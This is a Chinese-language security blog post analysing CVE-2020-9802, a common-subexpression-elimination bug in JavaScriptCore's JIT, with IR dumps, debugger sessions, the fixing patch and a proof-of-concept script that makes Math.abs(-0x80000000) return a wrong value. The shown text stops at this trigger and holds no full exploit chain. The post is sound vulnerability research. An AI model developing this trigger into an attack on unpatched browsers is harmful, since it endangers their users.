<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;245946 0x00 前言编译器优化中有一项CSE（公共子表达式消除），如果JS引擎在执行时类型收集的不正确，将导致表达式被错误的消除引发类型混淆。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2020-9802 JSC CSE漏洞分析">
<meta property="og:url" content="https://github.com/2021/07/07/CVE-2020-9802/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;245946 0x00 前言编译器优化中有一项CSE（公共子表达式消除），如果JS引擎在执行时类型收集的不正确，将导致表达式被错误的消除引发类型混淆。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://p4.ssl.qhimg.com/t01fcd71accb00ede79.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t011eb47328124968ce.png">
<meta property="og:image" content="https://p5.ssl.qhimg.com/t014b102d096c86088c.png">
<meta property="article:published_time" content="2021-07-07T02:00:57.000Z">
<meta property="article:modified_time" content="2025-06-26T10:16:37.512Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="JS引擎漏洞">
<meta property="article:tag" content="类型混淆">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://p4.ssl.qhimg.com/t01fcd71accb00ede79.png">

<link rel="canonical" href="https://github.com/2021/07/07/CVE-2020-9802/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2020-9802 JSC CSE漏洞分析 | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2021/07/07/CVE-2020-9802/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2020-9802 JSC CSE漏洞分析
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-07 10:00:57" itemprop="dateCreated datePublished" datetime="2021-07-07T10:00:57+08:00">2021-07-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245946">https://www.anquanke.com/post/id/245946</a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>编译器优化中有一项CSE（公共子表达式消除），如果JS引擎在执行时类型收集的不正确，将导致表达式被错误的消除引发类型混淆。</p>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="CSE"><a href="#CSE" class="headerlink" title="CSE"></a>CSE</h3><p>公共子表达式消除即为了去掉那些相同的重复计算，使用代数变换将表达式替换，并删除多余的表达式，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let c = Math.sqrt(a*a + a*a);</span><br></pre></td></tr></table></figure>
<p>将被优化为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let tmp = a*a;</span><br><span class="line">let c = Math.sqrt(tmp + tmp);</span><br></pre></td></tr></table></figure>
<p>这样就节省了一次乘法，现在我们来看下列代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let c = o.a;</span><br><span class="line">f();</span><br><span class="line">let d = o.a;</span><br></pre></td></tr></table></figure>
<p>由于在两个表达式之间多了一个f()函数的调用，而函数中很有可能改变.a的值或者类型，因此这两个公共子表达式不能直接消除，编译器会收集o.a的类型信息，并跟踪f函数，收集信息，如果到f分析完毕，o.a的类型也没有改变，那么let d &#x3D; o.a;就可以不用再次检查o.a的类型。<br>在JSC中，CSE优化需要考虑的信息在<code>Source/JavaScriptCore/dfg/DFGClobberize.h</code>中被定义，从文件路径可以知道，这是一个在DFG阶段的相关优化，文件中有一个<code>clobberize</code>函数，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename ReadFunctor, typename WriteFunctor, typename DefFunctor&gt;</span><br><span class="line">void clobberize(Graph&amp; graph, Node* node, const ReadFunctor&amp; read, const WriteFunctor&amp; write, const DefFunctor&amp; def)</span><br><span class="line">&#123;</span><br><span class="line">.............................................</span><br><span class="line">    case CompareEqPtr:</span><br><span class="line">        def(PureValue(node, node-&gt;cellOperand()-&gt;cell()));</span><br><span class="line">        return;</span><br><span class="line">..............................................</span><br></pre></td></tr></table></figure>
<p>clobberize函数中的<code>def</code>操作定义了CSE优化时需要考虑的因素，例如上面的<code>def(PureValue(node, node-&gt;cellOperand()-&gt;cell()));</code>，如果要对<code>CompareEqPtr</code>运算进行CSE优化，需要考虑的因素除了value本身的值，还需要的是Operand（操作数）的类型(cell)。</p>
<h3 id="边界检查消除"><a href="#边界检查消除" class="headerlink" title="边界检查消除"></a>边界检查消除</h3><p>与V8的checkbounds消除类似，当数组的下标分析确定在数组的大小范围之内，则可以消除边界检查，但如果编译器本身的检查方式出现溢出等问题，编译器认为idx在范围之内而实际则可能不在范围内，错误的消除边界检查将导致数组溢出。<br>为了研究JSC在什么条件下可以消除边界检查，我们使用如下代码进行测试调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function foo(arr,idx) &#123;</span><br><span class="line">   idx = idx | 0;</span><br><span class="line">   if (idx &lt; arr.length) &#123;</span><br><span class="line">      if (idx &amp; 0x3) &#123;</span><br><span class="line">         idx += -2;</span><br><span class="line">      &#125;</span><br><span class="line">      if (idx &gt;= 0) &#123;</span><br><span class="line">         return arr[idx];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1.1,2.2,3.3,4.4,5.5,6.6];</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0xd0000;i++) &#123;</span><br><span class="line">   foo(arr,2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">debug(describe(arr));</span><br><span class="line">print();</span><br><span class="line">debug(foo(arr,0x3));</span><br></pre></td></tr></table></figure>
<p>给print的函数断点用于中断脚本以进行调试<code>b *printInternal</code>，运行时加上-p选项将优化时的数据输出为json，从json文件中，我们看到foo函数的字节码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[   0] enter</span><br><span class="line">[   1] get_scope          loc4</span><br><span class="line">[   3] mov                loc5, loc4</span><br><span class="line">[   6] check_traps        </span><br><span class="line">[   7] bitor              arg2, arg2, Int32: 0(const0)</span><br><span class="line">[  12] get_by_id          loc6, arg1, 0</span><br><span class="line">[  17] jnless             arg2, loc6, 29(-&gt;46)</span><br><span class="line">[  21] bitand             loc6, arg2, Int32: 3(const1)</span><br><span class="line">[  26] jfalse             loc6, 9(-&gt;35)</span><br><span class="line">[  29] add                arg2, arg2, Int32: -2(const2), OperandTypes(126, 3)</span><br><span class="line">[  35] jngreatereq        arg2, Int32: 0(const0), 11(-&gt;46)</span><br><span class="line">[  39] get_by_val         loc6, arg1, arg2</span><br><span class="line">[  44] ret                loc6</span><br><span class="line">[  46] ret                Undefined(const3)</span><br></pre></td></tr></table></figure>
<p>其中<code>[  39] get_by_val         loc6, arg1, arg2</code>用于从数组中取出数据，在DFG JIT时，其展开的汇编代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7fffaf101fa3: mov $0x7fffaef0bb48, %r11</span><br><span class="line">0x7fffaf101fad: mov (%r11), %r11</span><br><span class="line">0x7fffaf101fb0: test %r11, %r11</span><br><span class="line">0x7fffaf101fb3: jz 0x7fffaf101fc0</span><br><span class="line">0x7fffaf101fb9: mov $0x113, %r11d</span><br><span class="line">0x7fffaf101fbf: int3 </span><br><span class="line">0x7fffaf101fc0: mov $0x7fffaef000dc, %r11</span><br><span class="line">0x7fffaf101fca: mov $0x0, (%r11)</span><br><span class="line">0x7fffaf101fce: cmp -0x8(%rdx), %esi</span><br><span class="line">0x7fffaf101fd1: jae 0x7fffaf1024cb</span><br><span class="line">0x7fffaf101fd7: movsd (%rdx,%rsi,8), %xmm0</span><br><span class="line">0x7fffaf101fdc: ucomisd %xmm0, %xmm0</span><br><span class="line">0x7fffaf101fe0: jp 0x7fffaf1024f2</span><br></pre></td></tr></table></figure>
<p>其中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fffaf101fce: cmp -0x8(%rdx), %esi</span><br><span class="line">0x7fffaf101fd1: jae 0x7fffaf1024cb</span><br></pre></td></tr></table></figure>
<p>用于检查下标是否越界，可见DFG JIT阶段并不会去除边界检查，尽管我们在代码中使用了if语句将idx限定在了数组的长度范围之内。边界检查去除表现在FTL JIT的汇编代码中，从json文件中可以看到FTL JIT时，对字节码字节码<code>[  39] get_by_val         loc6, arg1, arg2</code>的展开如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D@86:&lt;!0:-&gt;	ExitOK(MustGen, W:SideState, bc#39, ExitValid)</span><br><span class="line">D@63:&lt;!0:-&gt;	CountExecution(MustGen, 0x7fffac9cf140, R:InternalState, W:InternalState, bc#39, ExitValid)</span><br><span class="line">D@66:&lt;!2:-&gt;	GetByVal(KnownCell:Kill:D@14, Int32:Kill:D@10, Check:Untyped:Kill:D@68, Check:Untyped:D@10, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsDouble, Double+OriginalCopyOnWriteArray+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc#39, ExitValid)  predicting NonIntAsDouble</span><br><span class="line">D@85:&lt;!0:-&gt;	KillStack(MustGen, loc6, W:Stack(loc6), ClobbersExit, bc#39, ExitInvalid)</span><br><span class="line">D@67:&lt;!0:-&gt;	MovHint(DoubleRep:D@66&lt;Double&gt;, MustGen, loc6, W:SideState, ClobbersExit, bc#39, ExitInvalid)</span><br><span class="line">ValueRep(DoubleRep:Kill:D@66&lt;Double&gt;, JS|PureInt, BytecodeDouble, bc#39, exit: bc#44, ExitValid)</span><br></pre></td></tr></table></figure>
<p>从中可以看到<code> GetByVal</code>中传递的参数中含有<code>InBounds</code>标记，那么其汇编代码中将不会检查下标是否越界，因为前面已经确定下标在范围内。为了查看FTL JIT生成的汇编代码，我们使用gdb调试，遇到print语句时会断点停下<br><img src="https://p4.ssl.qhimg.com/t01fcd71accb00ede79.png"><br>此时，我们对<code>butterfly</code>中对应的位置下一个硬件读断点，然后继续运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; rwatch *0x7ff803ee4018</span><br><span class="line">Hardware read watchpoint 79: *0x7ff803ee4018</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<p>然后断点断下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  0x7fffaf101b9c    movabs r11, 0x7fffaef000dc</span><br><span class="line">  0x7fffaf101ba6    mov    byte ptr [r11], 0</span><br><span class="line">  0x7fffaf101baa    cmp    esi, dword ptr [rdx - 8]</span><br><span class="line">  0x7fffaf101bad    jae    0x7fffaf102071 &lt;0x7fffaf102071&gt;</span><br><span class="line"></span><br><span class="line">  0x7fffaf101bb3    movsd  xmm0, qword ptr [rdx + rsi*8]</span><br><span class="line">► 0x7fffaf101bb8    ucomisd xmm0, xmm0</span><br><span class="line">  0x7fffaf101bbc    jp     0x7fffaf102098 &lt;0x7fffaf102098&gt;</span><br></pre></td></tr></table></figure>
<p>我们发现这仍然存在<code>cmp    esi, dword ptr [rdx - 8]</code>检查了下标，这是由于<code>FTL JIT</code>是延迟优化的，可能还没优化过来，我们按照前面的步骤重新试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  0x7fffaf1039fa    mov    eax, 0xa</span><br><span class="line">  0x7fffaf103a00    mov    rsp, rbp</span><br><span class="line">  0x7fffaf103a03    pop    rbp</span><br><span class="line">  0x7fffaf103a04    ret    </span><br><span class="line"></span><br><span class="line">  0x7fffaf103a05    movsd  xmm0, qword ptr [rdx + rax*8]</span><br><span class="line">► 0x7fffaf103a0a    ucomisd xmm0, xmm0</span><br><span class="line">  0x7fffaf103a0e    jp     0x7fffaf103aeb &lt;0x7fffaf103aeb&gt;</span><br></pre></td></tr></table></figure>
<p>发现这次，边界检查被去除了，为了查看更多的代码片段，我们使用gdb的dump命令将这段代码dump出来用IDA分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap 0x7fffaf103a0a</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7fffaf0ff000     0x7fffaf104000 rwxp     5000 0       +0x4a0a</span><br><span class="line">pwndbg&gt; dump memory ./2.bin 0x7fffaf0ff000 0x7fffaf104000</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p><img src="https://p3.ssl.qhimg.com/t011eb47328124968ce.png"><br>可以看到语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (idx &amp; 0x3) &#123;</span><br><span class="line">   idx += -2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行完毕后，无需再一次检查<code>idx &lt; arr.length</code>，因为这是一个减法操作，正常情况下idx减去一个正数肯定会变小，小于arr.length，因此就去掉了边界检查。</p>
<h2 id="0x02-漏洞分析利用"><a href="#0x02-漏洞分析利用" class="headerlink" title="0x02 漏洞分析利用"></a>0x02 漏洞分析利用</h2><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/Source/JavaScriptCore/dfg/DFGClobberize.h b/Source/JavaScriptCore/dfg/DFGClobberize.h</span><br><span class="line">index b2318fe03aed41e0309587e7df90769cb04e3c49..5b34ec5bd8524c03b39a1b33ba2b2f64b3f563e1 100644 (file)</span><br><span class="line">--- a/Source/JavaScriptCore/dfg/DFGClobberize.h</span><br><span class="line">+++ b/Source/JavaScriptCore/dfg/DFGClobberize.h</span><br><span class="line">@@ -228,7 +228,7 @@ void clobberize(Graph&amp; graph, Node* node, const ReadFunctor&amp; read, const WriteFu</span><br><span class="line"> </span><br><span class="line">     case ArithAbs:</span><br><span class="line">         if (node-&gt;child1().useKind() == Int32Use || node-&gt;child1().useKind() == DoubleRepUse)</span><br><span class="line">-            def(PureValue(node));</span><br><span class="line">+            def(PureValue(node, node-&gt;arithMode()));</span><br><span class="line">         else &#123;</span><br><span class="line">             read(World);</span><br><span class="line">             write(Heap);</span><br><span class="line">@@ -248,7 +248,7 @@ void clobberize(Graph&amp; graph, Node* node, const ReadFunctor&amp; read, const WriteFu</span><br><span class="line">         if (node-&gt;child1().useKind() == Int32Use</span><br><span class="line">             || node-&gt;child1().useKind() == DoubleRepUse</span><br><span class="line">             || node-&gt;child1().useKind() == Int52RepUse)</span><br><span class="line">-            def(PureValue(node));</span><br><span class="line">+            def(PureValue(node, node-&gt;arithMode()));</span><br><span class="line">         else &#123;</span><br><span class="line">             read(World);</span><br><span class="line">             write(Heap);</span><br></pre></td></tr></table></figure>
<p>该patch修复了漏洞，从patch中可以知道，这原本是一个跟CSE优化有关的漏洞，patch中加入了<code>node-&gt;arithMode()</code>参数，那么在CSE优化时，不仅要考虑操作数的值，还要考虑算术运算中出现的溢出等因素，即使最终的值一样，如果其中一个表达式是溢出的，也不能进行CSE优化。</p>
<h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>首先从patch可以知道，修改的内容分别在<code>ArithAbs</code>和<code>ArithNegate</code>分支，它们分别对应了JS中的<code>Math.abs</code>和<code>-</code>运算。<br>尝试构造如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function foo(n) &#123;</span><br><span class="line">   if (n &lt; 0) &#123;</span><br><span class="line">      let a = -n;</span><br><span class="line">      let b = Math.abs(n);</span><br><span class="line">      debug(b);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x30000;i++) &#123;</span><br><span class="line">   foo(-2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>foo部分字节码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  17] negate             loc7, arg1, 126</span><br><span class="line">..........</span><br><span class="line">[  48] call               loc6, loc8, 2, 18</span><br></pre></td></tr></table></figure>
<p>分别代表了-n和Math.abs(n);，在DFG JIT阶段，其展开为如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ 17]</span><br><span class="line">CountExecution</span><br><span class="line">GetLocal</span><br><span class="line">ArithNegate(Int32:D@39, Int32|PureInt, Int32, Unchecked, Exits, bc#17, ExitValid)</span><br><span class="line">MovHint</span><br><span class="line">[ 48]</span><br><span class="line">CountExecution</span><br><span class="line">FilterCallLinkStatus</span><br><span class="line">ArithAbs(Int32:D@39, Int32|UseAsOther, Int32, CheckOverflow, Exits, bc#48, ExitValid)</span><br><span class="line">Phantom</span><br><span class="line">Phantom</span><br><span class="line">MovHint</span><br></pre></td></tr></table></figure>
<p>在FTL JIT阶段，代码变化如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ 17]</span><br><span class="line">CountExecution</span><br><span class="line">ArithNegate(Int32:Kill:D@76, Int32|PureInt, Int32, Unchecked, Exits, bc#17, ExitValid)</span><br><span class="line">KillStack</span><br><span class="line">ZombieHint</span><br><span class="line">[ 48]</span><br><span class="line">CountExecution</span><br><span class="line">FilterCallLinkStatus</span><br><span class="line">KillStack</span><br><span class="line">ZombieHint</span><br></pre></td></tr></table></figure>
<p>可以看到<code>ArithAbs</code>被去除了，这就是漏洞所在，<code>ArithAbs</code>与<code>ArithNegate</code>的不同点在于，<code>ArithNegate</code>不检查溢出，而<code>ArithAbs</code>会检查溢出，因此对于0x80000000这个值，<code>-0x80000000</code>值仍然为<code>-0x80000000</code>，是一个32位数据，而<code>Math.abs(-0x80000000)</code>将扩展位数，值为<code>0x80000000</code>。显然编译器没有察觉到这一点，将<code>ArithAbs</code>与<code>ArithNegate</code>认为是公共子表达式，于是便可以进行互相替换。<br>因此构造的POC如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function foo(n) &#123;</span><br><span class="line">   if (n &lt; 0) &#123;</span><br><span class="line">      let a = -n;</span><br><span class="line">      let b = Math.abs(n);</span><br><span class="line">      debug(b);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0xc0000;i++) &#123;</span><br><span class="line">   foo(-2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(-0x80000000);</span><br></pre></td></tr></table></figure>
<p>程序输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">..............</span><br><span class="line">--&gt; 2</span><br><span class="line">--&gt; 2</span><br><span class="line">--&gt; 2</span><br><span class="line">--&gt; 2</span><br><span class="line">--&gt; 2</span><br><span class="line">--&gt; -2147483648</span><br></pre></td></tr></table></figure>
<p>可以看到，这个值并不是<code>Math.abs(-0x80000000)</code>的准确值。</p>
